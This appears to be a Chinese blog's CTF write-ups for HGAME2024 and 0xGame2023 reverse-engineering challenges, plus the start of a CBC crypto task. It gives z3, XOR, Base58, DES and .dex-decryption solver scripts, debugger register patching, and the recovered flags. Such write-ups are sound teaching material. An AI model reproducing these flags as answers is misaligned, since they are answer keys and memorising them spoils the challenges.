对应地址，重新反编译看到真正的代码逻辑。这里的反调和smc设计的很巧妙，在解密之前已经是一个正常的函数，只不过最后解出fake flag，如果不仔细看很难发现这里暗藏玄机。\n解密后发现是方程，用z3求解。\n考虑到方程中用了左移，最开始用z3的Bitvecs(8) 创建变量，不过确实慢，要跑大概两个多小时。而且比较疑惑的是这种方法解出的flag只有部分正确，其余的超过ascii可见字符范围。\nhgame{S\\xcdC\\xdf\\xb4n\\xe4\\xdfs0\\xec\\xf61ng_equ4t\\xb1On\\xf3} 参考官方wp，改用Ints 创建变量，效果立竿见影。得到正确flag\nfrom z3 import * (v5,v28,v11,v10,v24,v41,v22,v40,v7,v18,v29,v27,v9,v31,v30,v20,v23,v39,v15,v21,v26,v2,v42,v6,v16,v1,v17,v25,v8,v4,v19,v3,v12,v13) = Ints(\u0026#34;v5 v28 v11 v10 v24 v41 v22 v40 v7 v18 v29 v27 v9 v31 v30 v20 v23 v39 v15 v21 v26 v2 v42 v6 v16 v1 v17 v25 v8 v4 v19 v3 v12 v13\u0026#34;) s = Solver() s.add(v18+201*v24+194*v10+142*v20+114*v39+103*v11+52*(v17+v31)+((v9+v23)*2**6)+14*(v21+4*v25+v25)+9*(v40+23*v27+v2+3*v1+4*v2+4*v6)+5*(v16+23*v30+2*(v3+2*v19)+5*v5+39*v15+51*v4)+24*(v8+10*v28+4*(v42+v7+2*v26))+62*v22+211*v41+212*v29==296473) s.add(207*v41+195*v22+151*v40+57*v5+118*v6+222*v42+103*v7+181*v8+229*v9+142*v31+51*v29+122*(v26+v20)+91*(v2+2*v16)+107*(v27+v25)+81*(v17+2*v18+v18)+45*(v19+2*(v11+v24)+v11+v24)+4*(3*(v23+v21+2*v23+5*v4)+v39+29*(v10+v1)+25*v15)+26*v28+101*v30+154*v3==354358) s.add(177*v40+129*v26+117*v42+143*v28+65*v8+137*v25+215*v21+93*v31+235*v39+203*v11+15*(v7+17*v30)+2*(v24+91*v9+95*v29+51*v41+81*v20+92*v18+112*(v10+v6)+32*(v22+2*(v1+v23))+6*(v2+14*v16+19*v15)+83*v5+53*v4+123*v19)+v17+175*v27+183*v3==448573) s.add(113*v19+74*v3+238*v6+140*v2+214*v26+242*v8+160*v21+136*v23+209*v9+220*v31+50*v24+125*v10+175*v20+23*v39+137*v22+149*v18+83*(v4+2*v30)+21*(9*v29+v16)+59*(4*v27+v17)+41*(v1+v41)+13*(v7+11*(v40+v15)+6*v42+4*(v28+2*v11)+v28+2*v11+17*v5)+36*v25==384306) s.add(229*v21+78*v1+v2+v9+133*v27+74*v6+69*v26+243*v7+98*v28+253*v8+142*v25+175*v31+105*v41+221*v10+121*v39+218*(v19+v29)+199*(v24+v30)+33*(v40+7*v17)+4*(27*v20+50*v11+45*v18+19*(v3+v42)+v16+16*v23+52*v4)+195*v22+211*v5+153*v15==424240) s.add(181*v25+61*v2+65*v21+58*v31+170*v29+143*v24+185*v10+86*v11+97*v22+235*(v23+v27)+3*(53*v41+74*(v8+v3)+13*(v42+6*v9)+11*(v39+7*v20)+15*(v18+4*v17)+v7+35*v1+29*v15)+4*(57*v6+18*(v5+2*v26)+v28+17*v16+55*v30)+151*v40+230*v4+197*v19==421974) s.add(209*v21+249*v30+195*v2+219*v25+201*v39+85*v18+213*(v17+v31)+119*(v11+2*v41)+29*(8*v24+v40+4*v27+v27)+2*(v8+55*(2*v29+v19)+3*(v10+39*v9+2*(v6+20*v20)+35*v7)+4*(v5+31*v42+28*v3)+26*v28+46*(2*v26+v16)+98*v1)+53*v23+171*v15+123*v4==442074) s.add(162*v19+74*v5+28*v27+243*v42+123*v28+73*v8+166*v23+94*v24+113*v11+193*v22+122*(v6+2*v7)+211*(v10+v25)+21*(v17+7*v41)+11*(v4+23*(v16+v39)+2*(v40+5*v30+2*(2*v18+v29)+2*v18+v29))+5*(46*v9+26*v20+4*(v31+2*v21)+v15+27*v2+10*v1)+36*(v3+5*v26)==376007) s.add(63*v19+143*v5+250*v6+136*v2+214*v40+62*v26+221*v42+226*v7+171*v28+178*v8+244*v23+(v9*2**7)+150*v31+109*v29+70*v41+127*v20+204*v39+121*v22+173*v18+69*(v25+v30+v27)+74*(v16+2*v15+v15)+22*(7*v24+v17+10*v11)+40*(v1+4*v21+v21)+81*v10+94*v4+84*v3==411252) s.add(229*v15+121*v4+28*v30+206*v16+145*v27+41*v1+247*v6+118*v26+241*v28+79*v8+102*v25+124*v23+65*v9+68*v31+239*v17+148*v24+245*v39+115*v11+163*v22+137*v18+53*(v5+2*v29)+126*(v40+2*v10)+38*(v7+v21+4*v7+6*v41)+12*(v2+16*v42)+109*v20+232*v3+47*v19==435012) s.add(209*v21+233*v40+93*v1+241*v2+137*v8+249*v17+188*v29+86*v24+246*v10+149*v20+99*v11+37*v22+219*v18+17*(v6+10*v25)+49*(v5+3*v3+4*v28+v28)+5*(16*v39+11*(v41+2*v27+v27)+12*v7+v31+30*v16+27*v19)+18*(v23+2*(v4+v26+2*v4)+v4+v26+2*v4)+24*v9+109*v42+183*v30+154*v15==392484) s.add(155*v15+247*v40+157*v28+119*v23+161*v17+133*v20+85*v22+229*(v7+v24)+123*(2*v31+v42)+21*(v41+12*v30)+55*(v9+v5+v18+2*v5)+15*(v3+16*v10+9*v21)+2*(v2+115*v29+111*v16+26*v6+88*v8+73*v39+71*v11+28*(v26+2*(v25+2*v1))+51*v27+99*v4+125*v19)==437910) s.add(220*v3+200*v4+139*v15+33*v5+212*v30+191*v16+30*v27+233*v1+246*v6+89*v2+252*v40+223*v42+19*v25+141*v21+163*v9+185*v17+136*v31+46*v24+109*v10+217*v39+75*v22+157*v18+125*(v11+v19)+104*(2*v41+v20)+43*(v28+2*v29+v29)+32*(v8+v7+2*v8+2*(v23+v26))==421905) s.add(211*v24+63*v15+176*v5+169*v16+129*v27+146*v40+111*v26+68*v42+39*v25+188*v23+130*v9+(v31*2**6)+91*v41+208*v20+145*v39+247*v18+93*(v22+v17)+71*(v6+2*v11)+103*(v8+2*v30)+6*(v21+10*v28+28*v7+9*v29+19*v2+24*v1+22*v3)+81*v10+70*v4+23*v19==356282) s.add(v12==v10+2*(v31+4*(v29+v17))+v31+4*(v29+v17)) s.add(94*v42+101*v2+152*v40+200*v7+226*v8+211*v23+121*v24+74*v11+166*v18+((v6+3*v28)*2**6)+41*(4*v9+v21)+23*(v39+11*v41)+7*(v20+10*v25+2*v12+v12)+3*(78*v30+81*v16+55*v27+73*v1+4*v26+v15+85*v3+65*v19)+62*v22+88*v5+110*v4==423091) s.add(133*v22+175*v15+181*v30+199*v16+123*v27+242*v1+75*v6+69*v2+153*v40+33*v26+100*v42+229*v7+177*v8+134*v31+179*v29+129*v41+14*v10+247*v24+228*v20+92*v11+86*(v9+2*v18)+94*(v23+v21)+37*(v17+4*v3)+79*(v25+2*v28)+72*v5+93*v39+152*v4+214*v19==391869) s.add(211*v24+213*v18+197*v40+159*v25+117*v21+119*v9+98*v17+218*v41+106*v39+69*v11+43*(v2+v29+2*v2)+116*(v4+v10+2*v26)+5*(v42+9*v23+35*v20+37*v31)+11*(v16+13*v27+5*v5+8*v30)+6*(29*v28+25*v8+38*v22+v15+13*v1+10*v3)+136*v7+142*v6+141*v19==376566) s.add(173*v3+109*v15+61*v30+187*v1+79*v6+53*v40+184*v21+43*v23+41*v9+166*v31+193*v41+58*v24+146*v10+(v20*2**6)+89*v39+121*v11+5*(v17+23*v8)+7*(29*v18+v29+4*v7)+13*(3*v42+v16+7*v26+13*v2)+3*(v4+83*v5+51*v27+33*v22+8*(v19+4*v28)+18*v25)==300934) s.add(78*v1+131*v5+185*v16+250*v40+90*v26+129*v42+255*v28+206*v8+239*v25+150*v10+253*v39+104*v22+58*(v2+2*v7)+96*(v15+v31)+117*(v9+2*v4)+27*(v17+8*v18+v18)+19*(v23+3*v21+4*v29+v29)+7*(22*v41+3*(v11+11*v24)+v3+29*v6+14*v27)+109*v20+102*v30+100*v19==401351) s.add(233*v19+71*v5+209*v27+82*v6+58*v26+53*v25+113*v23+206*v31+39*v41+163*v20+222*v11+191*v18+123*(v7+v40)+69*(v9+2*v22+v22)+9*(v3+8*v24+7*(3*v1+v28)+5*v16+19*v30)+4*(v15+26*v17+61*v29+43*v42+49*v2+32*v4)+10*(7*(v8+3*v21)+v39+12*v10)==368427) s.add(139*v30+53*v5+158*v16+225*v1+119*v6+67*v2+213*v40+188*v28+152*v8+187*v21+129*v23+54*v9+125*v17+170*v24+184*v11+226*v22+253*v18+26*(v29+v41)+97*(v4+2*v25)+39*(5*v26+v27)+21*(v39+8*v42)+12*(17*v10+v31+15*v7+12*v19)+165*v20+88*v15+157*v3==403881) s.add(114*v3+61*v27+134*v40+62*v42+89*v9+211*v17+163*v41+66*v24+201*(v7+v18)+47*(5*v16+v22)+74*(v4+v31)+142*(v2+v28)+35*(v20+6*v26)+39*(v15+6*v30)+27*(v25+9*v23+8*v6)+4*(v21+63*v19+2*(v1+12*(v10+v5)+8*v11+26*v29))+10*(v8+4*v39+v39)==382979) s.add(122*v25+225*v21+52*v23+253*v9+197*v17+187*v31+181*v29+183*v41+47*v20+229*v39+88*v22+127*(v10+2*v18)+37*(v7+3*v3)+((v11+2*v30+v30)*2**6)+7*(21*v8+v27+18*(v4+v1+2*v16))+6*(23*v24+v26+17*v2+39*v6)+10*(v5+11*v28+21*v42)+149*v19+165*v40+121*v15==435695) s.add(165*v20+223*v4+249*v5+199*v1+135*v2+133*v26+254*v42+111*v7+189*v28+221*v25+115*v21+186*v9+79*v41+217*v24+122*v11+38*v18+109*(2*v31+v29)+14*(v8+17*v40+8*(v6+2*v16))+4*(11*(5*v30+v39)+6*(v10+2*v22)+v27+52*v17+50*v23)+229*v15+86*v3+234*v19==453748) s.add(181*v25+94*v42+125*v1+226*v26+155*v7+95*v21+212*v17+91*v31+194*v29+98*v24+166*v11+120*v22+59*v18+32*(v9+v8)+158*(v6+v5)+101*(v41+v19)+63*(v4+2*v23)+67*(v28+2*v20)+11*(v39+10*v16+11*v10)+39*(v30+4*(v2+v15))+233*v40+56*v27+225*v3==358321) s.add(229*v21+135*v4+197*v15+118*v5+143*v16+134*v6+204*v40+173*v26+81*v7+60*v28+58*v8+179*v23+142*v9+178*v17+230*v31+148*v29+224*v41+194*v24+223*v10+87*v20+200*v39+233*v11+49*v22+127*(v25+v30)+31*(4*v27+v18)+42*(v1+6*v2)+109*v42+75*v3+165*v19==456073) s.add(41*v4+253*v3+163*v15+193*v30+155*v16+113*v27+131*v6+55*v2+21*v40+53*v26+13*v8+201*v25+237*v9+223*v31+95*v24+194*v20+62*v39+119*v11+171*v22+135*v18+69*(v10+3*v28)+211*(v1+v29)+4*(43*v7+v42+40*v17)+6*(v5+33*v41+20*(2*v19+v21)+24*v23)==407135) s.add(v13==v6+v1+8*v6+4*(v8+2*v27)) s.add(111*v19+190*v3+149*v4+173*v28+118*v23+146*v29+179*v10+51*v20+49*v39+61*v11+125*v22+162*v18+214*(v25+v30)+14*(2*v31+v24)+178*(v41+v16)+11*(4*v9+v21+17*v42)+65*(v26+v17+2*v26+2*v5)+4*(v7+38*v15+4*v13+v13+8*v40+43*v2)==369835) s.add(27*v27+223*v6+147*v26+13*v21+35*(v17+7*v4)+57*(v19+2*v18+3*v11)+11*(v1+17*(v9+v5)+10*v16+3*v31)+2*(53*v23+v25+38*v15+43*v42+115*v29+61*v22+111*(v10+v40)+14*(v20+v7+2*v7+8*v28)+109*v2+100*v41+63*v8)+93*v39+251*v30+131*v3==393303) s.add(116*v9+152*v29+235*v20+202*v18+85*(v8+3*v11)+221*(v16+v40)+125*(2*v41+v24)+7*(19*v4+9*(v10+2*v25)+v2+33*v3+32*v19)+3*(71*v39+43*v22+32*(v17+v26)+15*(v5+v6+2*v23)+v28+74*v31+48*v42)+10*(v21+11*v30+16*v15)+136*v7+106*v1+41*v27==403661) s.add(127*v4+106*v15+182*v30+142*v5+159*v16+17*v1+211*v6+134*v2+199*v7+103*v28+247*v23+122*v9+95*v41+62*v10+203*v39+16*v11+41*(6*v42+v25)+9*(22*v24+v20+27*v31+28*v40)+10*(v8+v22+3*v21+8*v17+2*(v22+3*v21+8*v17)+13*v29)+6*(23*v27+v26)+213*v18+179*v3+43*v19==418596) s.add(149*v19+v1+133*v22+207*v41+182*v26+234*v7+199*v8+168*v21+58*v10+108*v20+142*v18+156*(v9+v25)+16*(v29+6*v31)+126*(v17+2*v39)+127*(v4+2*v27+v40)+49*(v30+4*v16)+11*(v5+22*v11)+5*(v15+v42+45*v24+50*v28)+109*v2+124*v6+123*v3==418697) flag = [] result = s.model() vars = (v5,v28,v11,v10,v24,v41,v22,v40,v7,v18,v29,v27,v9,v31,v30,v20,v23,v39,v15,v21,v26,v2,v42,v6,v16,v1,v17,v25,v8,v4,v19,v3) for var in vars: flag.append(result[var].as_long()) print(bytes(flag).decode()) change # hook，有点像回调函数\n两个加密函数（隔一个字节）交替进行加密。\ndata = [0x13, 0x0A, 0x5D, 0x1C, 0x0E, 0x08, 0x23, 0x06, 0x0B, 0x4B, 0x38, 0x22, 0x0D, 0x1C, 0x48, 0x0C, 0x66, 0x15, 0x48, 0x1B, 0x0D, 0x0E, 0x10, 0x4F] key=b\u0026#34;am2qasl\u0026#34; flag = [] for i in range(len(data)): if(i % 2 == 0): result = (data[i] -10) ^ key[i % len(key)] else: result = data[i] ^ key[i % len(key)] flag.append(result) print(bytes(flag)) ","date":"2024-03-01","externalUrl":null,"permalink":"/writeups/hgame2024/","section":"Writeups","summary":"reverse writeup of Hgame2024","title":"HGAME2024 Revserse","type":"writeups"},{"content":"nothing here\n","date":"2024-02-01","externalUrl":null,"permalink":"/docs/","section":"1n1t-Flare Blog","summary":"","title":"docs","type":"page"},{"content":" Week1 # 数字筑基 # 在IDA中打开文件，一眼flag。\n代码金丹 # IDA打开即送 +1\n网络元婴 # IDA打开即送 +2。\t从上到下输入即可。\n虚拟化神 # 反编译程序，在main函数中找到关键变量v13。它的值没有明确给出，而且后续一系列的xor操作都和它有关系，所以通过动态调试找到内存中的值。实际上就是flag。\n另一方面，如果不调试。按照官方wp的提示，这个程序会生成一个文件config.txt。之后根据其内容判断是否输出v13的内容。具体的逻辑是提取config.txt的前两个字符，转换为整数并与1比较。这里直接修改该文件，把0改成1，之后运行程序就能拿到flag。\n赛博天尊 # 分析程序逻辑：do...while部分判断输入Buffer的长度，要求长度为44。其中最后一个字符为}（ascii 125），接下来以-为分隔符将flag内部32位十六进制数拆分成五部分，各部分满足方程组。\n核心在于解方程组，这里尝试了两种方法。\n用 sympy 库求解 #python from sympy import * v7,v8,v9,v10,v11=symbols(\u0026#39;v7 v8 v9 v10 v11\u0026#39;) equations=[Eq(7 * v9 + 5 * (v8 + v11) + 2 * (v10 + 4 * v7) , 0x12021DE669FC2), Eq( v8 + 3 * (v9 + v10 + 2 * v10 + 2 * (v11 + v7)) , 0x159BFFC17D045), Eq(v10 + 3 * (v11 + 3 * v9) + 2 * (v8 + 4 * v7) , 0xACE320D12501), Eq(v8 + 2 * (v7 + v11 + v9 + 2 * v10) , 0x733FFEB3A4FA), Eq(v8 + 7 * v11 + 8 * (v9 + v10) + 5 * v7 , 0x1935EBA54EB28)] solution = solve(equations) solution = sorted(solution.items(), key=lambda item:int(str(item[0])[1:])) hexs=[] for value in solution: hexs.append(hex(value[1])[2:]) flag=\u0026#39;0xGame{\u0026#39;+\u0026#39;{}-{}-{}-{}-{}\u0026#39;.format(*hexs)+\u0026#39;}\u0026#39; print(flag) 用 z3 模块求解\nz3求解出来的结果是z3.RatNumRef类型的，不是内置类型。需要转换为int型。此外要先用Solver.check()判断解的情况，才能调用 Solver.model() 输出解。\n#python from z3 import * v7,v8,v9,v10,v11=Reals(\u0026#39;v7 v8 v9 v10 v11\u0026#39;) s=Solver() s.add(7 * v9 + 5 * (v8 + v11) + 2 * (v10 + 4 * v7) == 0x12021DE669FC2) s.add(v8 + 3 * (v9 + v10 + 2 * v10 + 2 * (v11 + v7)) == 0x159BFFC17D045) s.add(v10 + 3 * (v11 + 3 * v9) + 2 * (v8 + 4 * v7) == 0xACE320D12501) s.add(v8 + 2 * (v7 + v11 + v9 + 2 * v10) == 0x733FFEB3A4FA) s.add(v8 + 7 * v11 + 8 * (v9 + v10) + 5 * v7 == 0x1935EBA54EB28) hexs=[] if isinstance(s.check(), CheckSatResult): result=s.model() for var in (v7,v8,v9,v10,v11): num = result[var].as_long() hexs.append(hex(num)[2:]) flag=\u0026#39;0xGame{\u0026#39;+\u0026#39;{}-{}-{}-{}-{}\u0026#39;.format(*hexs)+\u0026#39;}\u0026#39; print(flag) Week2 # 符文解密师 # 32位程序，IDA打开，在hex窗口找到flag\n编译逆旅者 # 文件后缀为.pyc可知是编译过的python程序。鉴于IDA反编译后的结果是C伪代码，并不能得到源python代码。于是考虑在线python反编译。\n在main()函数中找到flag的十六进制形式。粘贴(ctrl+shift+v)到十六进制编辑器010Editor中得到flag。\n码海舵师 # 32位IDA打开，F5反编译代码如下：\n在21行位置发现可疑的一串乱码，末尾‘=’盲猜是base64，在线解密。\n注册侦探 # 反编译main函数，发现是c++程序，而且调用了很多API函数。分析程序逻辑后发现flag是在一系列判断之后生成并且输出的，所以尝试动态调试。刚开始不知道RegOpenKeyExA,RegQueryValueExA这两个函数的功能，也没有去查。当时思路是修改寄存器的返回值，绕过这两个函数，但在动调过程中发现无法改data的值。所以最后flag没有生成。\n换一种思路，在输出时数据经过了0x33的异或，那么数据是怎么来的？一点点往回找发现和Src变量有关，而且函数中有Src数组的全部值。尝试了一下把Src[0]逐字节异或0x33，结果是0xGa，和flag正好对应。说明就是单字节异或，写脚本解密就得到flag。\n#python \u0026#39;\u0026#39;\u0026#39; Src[0] = 1383353091; Src[1] = 189290078; Src[2] = 38864395; Src[3] = 503515984; Src[4] = 1364350722; Src[5] = 1448105758; Src[6] = 89136641; Src[7] = 85852241; Src[8] = 72812293; Src[9] = 50464516; Src[10] = 1314325334; \u0026#39;\u0026#39;\u0026#39; Src=[1383353091, 189290078, 38864395, 503515984, 1364350722, 1448105758, 89136641, 85852241, 72812293, 50464516, 1314325334] flag=bytes() for num in Src: byte=num.to_bytes(4,\u0026#39;little\u0026#39;) for i in byte: flag+=(i^0x33).to_bytes(1) print(flag.decode()) #0xGame{885b1c80-1dab-dce2-c6b3-664d77410e0d} 看了官方wp，还是从RegOpenKeyExA,RegQueryValueExA入手，创建注册表值，之后运行程序得到flag\n壳艺大师 # 在DIE里查壳发现有upx壳，先进行脱壳。\n程序反编译后整体看上去有点复杂，涉及到很多未知函数。跟踪这些函数，发现大多数没有什么实际用处，感觉像是用来混淆的，暂且忽略它们。核心的判断部分也比较抽象，v7，v8等变量都对应寄存器的值，并不在内存中。缺少关键值，仅凭静态调试梳理不出完整的逻辑。但能看出和异或有关。\n动调也显得繁琐，涉及寄存器的变量还是很多的。（不知道是不是脱壳的原因）\n既然分析不出明确的逻辑，那就猜一下吧。main函数中依然有一系列的数组赋值语句，和上一题非常相似。推测还是对这些数据异或求flag。最开始分析string的时候发现的'The0xGameKey'应该是密钥，循环异或。\n#python from pwn import * src=[0x64, 0x10, 0x22, 0x51, 0x15, 0x22, 0x1A, 0x0F, 0x06, 0x7C, 0x01, 0x18, 0x6C, 0x0A, 0x56, 0x1D, 0x4B, 0x7E, 0x57, 0x08, 0x48, 0x28, 0x51, 0x4C, 0x60, 0x45, 0x07, 0x53, 0x1E, 0x77, 0x4C, 0x5E, 0x5D, 0x7B, 0x53, 0x4F, 0x61, 0x59, 0x07, 0x52, 0x1C, 0x74, 0x07, 0x10] flag=xor(bytes(src),b\u0026#39;The0xGameKey\u0026#39;) print(flag) #b\u0026#39;0xGame{bc7da8b3-396e-c454-bcf0-3806651bbd3f}\u0026#39; Week3 # 代码启示录 # 打开发现是.jar文件，在本地安装JDK来配置Java环境。用反编译器GDA打开文件，一眼flag。\n旋转密码城 # 同上GDA打开，Main类中定义了CaesarPlus() 函数，不难发现是变种的凯撒密码。把密码移位的范围从字母扩大到了ASCII可打印字符的范围。密文在main()主函数中给出。编写python脚本解密：\nenc=\u0026#34;_Iv2\u0026gt;6L424c_4c2\\\\f__5\\\\7fec\\\\da32\\\\3ef2`cgd4b46N\u0026#34; flag=\u0026#39;\u0026#39; for char in enc: index=ord(char) result=index-33-47 if result\u0026lt;0: result+=94 flag+=chr(result+33) print(flag) 变量迷城 # 对Java，android逆向都不太熟悉，拿着反编译代码问了几次GPT。勉强理清了主要的逻辑。\n程序只有一个Main类，直接给了decryptFlag解密函数，能看出来还是循环异或。下面的lambda$static$0函数给出了关于x和y的方程组，可以解出x和y。brand变量也已知是'0xGame'\n#python from z3 import * x,y = Reals(\u0026#39;x y\u0026#39;) s=Solver() s.add(x**2+2*y**2+3*x+4*y == 7384462351178) s.add(5*x**2+6*y**2+7*x+8*y == 22179606057658) print(s.model()) #[y = 1919810, x = 114514] main()的末尾调用解密函数，能看出密钥是x和brand拼接的字符串。但是整个程序并没有给出原始数据，所以不能写脚本解密了。试一下运行程序，但是另一个问题是，程序从头到尾没有任何输入，我们只能等它自己生成flag然后输出。\n结合上网搜索和wp，System.getenv，System.getProperty这两个函数比较关键，提示要创建环境变量和 JVM变量。在命令行中进行设置即可，最后运行jar程序得到flag。\nSystem.getenv()读取的是当前系统环境的环境变量。可以通过 System.getEnv(key) 获取对应环境变量的值。\n通过 System.getProperty(key)获取单个变量值，通过System.getPropertys() 获取所有 JVM 环境变量值。\n启动JVM时，可以通过 -D 设置JVM 环境变量值\n之前一直认为逆向题的flag都是输入到程序的正确字符串，其实是陷入思维定式了。这几周的一些题不是简单地判断输入，而是检查系统的文件或者是变量，还是很打开眼界的。最后还踩了坑：参考wp在cmd敲了命令，结果报错。发现是多了不必要的空格。用powershell试了试发现这段命令不能正常运行。powershell里面set命令不能修改环境变量，要用set-item。\n(cmd.exe) set x=114514 set y=1919810 java -Dbrand=0xGame -jar \u0026#34;C:\\Users\\LENOVO\\Desktop\\变量迷城.jar\u0026#34; 数字幽灵城 # 反编译程序，看到有一个Base58类，说明这道题用到Base58算法。之前对Base64接触比较多，对于Base58不是很了解。于是上网查了一下原理。\nbase58加密与其他base系列不同的是： base64是每6bit位一个映射，base32是每5bit位一个映射 base58不是根据bit位而来，而是直接模58而映射的\n其算法很简单 就是将字符流转成256进制的一个超大数 然后不断的模58 最后得到的结果逆序即是结果\n分析一下decode函数，就是模58的逆运算，能确定是正常的Base58，没有魔改。接下来分析MainActivity类，内部对编码后的flag，也就是变量C0587R.string.encodedFlag进行解码，再和用户输入的flag比对。我们将经过编码的flag提取出来手动解码即可。查找encodedFlag，应该在资源文件里。\nRmC442S4tDMzc3CvzoCx8toKodL8SE8GRQSmz8M84k6g9jG1vVrf3c5TECZR 复制下来拿工具解码即可。大部分在线工具的Base58编码表都是按照比特币的标准，数字在前，之后是大写字母和小写字母。和本题程序的编码表不一样，所以在cyberchef换一下表，进行解码。\n虚构核心 # 用jadx反编译程序，核心的函数都在MainActivity类里面。onClick函数调用checkFlag函数进行判断。继续分析checkFlag函数，发现还需要调用FlagCheker类的checkFlag方法。在反编译的结果里面没找到这个类，推测应该和encrypted.dex有关，但是需要解密出decrypted.dex。程序最后给出了解密函数，和密钥The0xGameKey逐字节异或。\n内置的加密文件不能在jadx里直接打开，也没找到直接导出的方法。将整个.apk文件重命名为.zip后缀的压缩包，解压后在 assets\\目录下找到了encrypted.dex。按照decrypt函数的逻辑手动解密。\n#include\u0026lt;stdio.h\u0026gt; #include\u0026lt;string.h\u0026gt; int main() { unsigned char key[] = \u0026#34;The0xGameKey\u0026#34;; FILE *encdex = fopen(\u0026#34;C:\\\\Users\\\\LENOVO\\\\Desktop\\\\encrypted.dex\u0026#34;,\u0026#34;rb+\u0026#34;); FILE *decdex = fopen(\u0026#34;C:\\\\Users\\\\LENOVO\\\\Desktop\\\\decrypted.dex\u0026#34;,\u0026#34;wb+\u0026#34;); unsigned char buf[16]; while (!feof(encdex)) { memset(buf,0,16); fread(buf,sizeof(char),12,encdex); for(int i=0; i\u0026lt;12; i++) { buf[i] ^= key[i]; } fwrite(buf,sizeof(char),12,decdex); } fclose(encdex); fclose(decdex); return 0; } 在010Editor中把解密文件最后面多出的一段删掉，之后用jadx反编译即可。在官方wp给的cmd5网站上查出3段md5的明文，最后各部分拼在一起得到flag\nWeek4 # 二进制学徒 # 在线反编译.pyc文件，直接看到flag\n代码悟道者 # 程序是一个.jar文件。反编译后发现main函数比较清晰，调用加密函数并将结果与内置的密文比较。而且给出了加密算法的具体信息即custom Base64，考虑到换表，用自定义解密工具进行解密得到flag。（这道题挺直白的没什么坑）\n回过头来分析（学习）一下程序中的Base64算法：先把输入的明文字符串转换为字节，每三个字节以二进制的形式拼接，再按6bit拆成4个字节。其中对二进制数据的处理没有采用数组，而是直接进行位运算，通过移位后或运算/移位后与运算实现了拼接和截取，很简洁高效。（和NSSRound18 的那道Base64对比了一下，但那题还要交换特定的bit）\n这里移位时右操作数为负，网上搜索发现结果未定义，根据整体功能猜测符号正负不影响移位结果。\n(摘自oi-wiki) 移位运算中如果出现如下情况，则其行为未定义：\n右操作数（即移位数）为负值； 右操作数大于等于左操作数的位数； 内存星旅者 # 首先静态分析，main函数不算复杂。可以看到比较核心的部分，其中包含两个函数 sub_7FF630D51510 和sub_7FF630D51600。二者还有同样的int型参数v6。\n进一步分析，第二个函数可能与生成flag有关。跟踪该函数，发现其内部有点乱，调用了一大堆未知的函数，但是有两个确定的API函数（GetTempPathA，DeleteFileA，可以上网查到功能）。大概猜测flag被写入一个临时文件，而且最后会删除这个文件。\n第一个函数也比较乱，我们的任务是让它的返回值不为0。最好同时能推出v6的值。这个函数需要命令行参数，但是很难从程序反编译的代码中推断该输入什么。复现的时候卡在这里了很久。最后也不去管这些参数了，采用动态调试直接修改寄存器的值，让rdi的最后一位不是零即可。v6的值还不能完全确定，根据官方wp发现其实是函数后面的1897488这个数（其实挺明显的，当时没想到\n同样按照动态调试修改寄存器的思路，F7进入第二个函数内部，把传入参数的ecx寄存器的值改为1897488（0x001CF410）。\n在DeleteFileA之前打一个断点，运行后就直接去找临时文件。在 C:\\Users\\LENOVO\\AppData\\Local\\Temp里找到了刚生成的文件，名字就叫flag。用记事本打开即可。\n指令神使 # 反编译main函数，发现整体逻辑还算清晰。先把unk_一类的数据恢复为字符串，然后分析程序。输入的flag保存在Str中，再对Str1分别调用sub_140001154和sub_140001118函数，最后与Str2比较。\n跟踪这两个函数，第一个就是简单地判断flag的格式。第二个函数进行加密，是题目的关键。不难看出是针对小写字母的rot13。（看到97，26就猜测和字母表有关系，可能是移位密码，比如摩斯之类的，再根据84推偏移量）最后用CyberChef解一下。把前缀补全。\n还注意到题目里的一个细节，反编译后的代码没有Str1的赋值语句，但是直接就对它调用函数。而且储存flag的Str数组长度至少是44，但声明部分 char Str[7];，显然会溢出。于是在栈窗口中查找这两个变量，发现它们是相连的，地址上刚好相差0x7，也就是说Str1储存的是Str溢出的内容。或者说Str1是指向Str+7的指针，这样也能解释为什么Str1能与Str2字符串的格式相对应。\n算法祭司 # 程序放到DIE里面查看是.NET32位程序，用dnSpy进行反编译，分析Main类。最开始对encryptedKey进行逐字节异或解密。之后读取用户输入，利用异或后的key做密钥，encryptedKey作为初始向量对其进行DES加密。\nMain类中直接给出了DES加密后的Base64编码结果。在资源文件中可以找到encryptedKey，进行异或得到密钥。最后写脚本解密DES即可。\n#python import base64 from Crypto.Cipher import DES encryptedkey=\u0026#34;STV\u0026gt;!\u0026#39;+#\u0026#34; key=\u0026#39;\u0026#39; result=\u0026#39;s7/e+JnJbGEdE9j2g3XHxgym+G6Fu/PjJuW80NeMKgemdqaWG9KVM8Tfcc0eRfaA\u0026#39; for c in encryptedkey: key+=chr(ord(c)^ord(\u0026#39;f\u0026#39;)) des=DES.new(key.encode(),DES.MODE_CBC,iv=encryptedkey.encode()) enc=base64.b64decode(result) flag=des.decrypt(enc) print(flag) #b\u0026#39;0xGame{8edf2e65-1cb3-2e1a-b2d1-b54d3d4bddc5}\\x04\\x04\\x04\\x04 ","date":"2024-01-02","externalUrl":null,"permalink":"/writeups/0xgame2023_re/","section":"Writeups","summary":"reverse writeup of 0xgame2023","title":"0xGame2023 Reverse","type":"writeups"},{"content":" Week1 # What\u0026rsquo;s CBC? # 查询资料知CBC是一种分组加密算法。把明文分为等长的几组，用初始化向量对第一组明文进行xor运算，再进行另一种加密得到第一组密文。接下来用第一组密文作为向量加密第二组明文……依次类推。\n注意到xor运算(⊕)的特殊性质： $$ A⊕0=A $$\n$$ A⊕A=0 $$\n如果两数xor后，对结果再xor这两个数中的一个，可以得到其中另一个数。 $$ (A⊕B)⊕B=A⊕(B⊕B)=A⊕0=A $$ 这样一来，解密就方便很多。但是最后的加密函数encrypt()中出现了未知的密钥key，所以首先要解出key。\n从 i ^ key 推测key是一个数而非bytes类型，而且对每一个i都进行了异或运算，理论上只要知道一个i就可以反推出来 (i ^ key ^i) 。我们已知flag的前七位是标准的 '0xGame{' 格式，题中每组明文或密文均为八位，于是再随便补一个字母凑成第一组明文，与iv异或后推key。\nfrom Crypto.Util.number import * f=b\u0026#39;0xGame{a\u0026#39; iv = b\u0026#39;11111111\u0026#39; enc=b\u0026#34;\\x8e\\xc6\\xf9\\xdf\\xd3\\xdb\\xc5\\x8e8q\\x10f\u0026gt;7.5\\x81\\xcc\\xae\\x8d\\x82\\x8f\\x92\\xd9o\u0026#39;D6h8.d\\xd6\\x9a\\xfc\\xdb\\xd3\\xd1\\x97\\x96Q\\x1d{\\\\TV\\x10\\x11\u0026#34; def bytes_xor(a,b): a,b=bytes_to_long(a),bytes_to_long(b) return long_to_bytes(a^b) k=bytes_xor(f,iv) for i in range(8): key=enc[i]^k[i] print(key) 